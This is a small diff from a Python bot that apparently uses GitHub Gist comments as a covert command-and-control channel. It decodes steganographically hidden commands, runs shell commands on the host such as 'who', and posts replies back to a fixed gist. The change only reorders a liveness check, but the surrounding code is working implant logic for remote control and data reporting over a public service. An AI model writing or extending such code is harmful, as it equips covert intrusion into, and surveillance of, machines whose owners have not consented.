@@ -25,11 +25,11 @@ def convert_to_plain_text(file_path):
 
 def handleCommands(command):
     fakeMessage = random.choice(botRandomMessage)
+    if command in botIsAliveQuestions:
+        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveAnswers))
     command = usteg.decode(command)
     if command == "Hey":
         GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body='Yo')
-    if command in botIsAliveQuestions:
-        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveAnswers))
     if command.startswith("w"):
         sendStr = os.popen("who | cut -d' ' -f1").read()
         if sendStr == "":
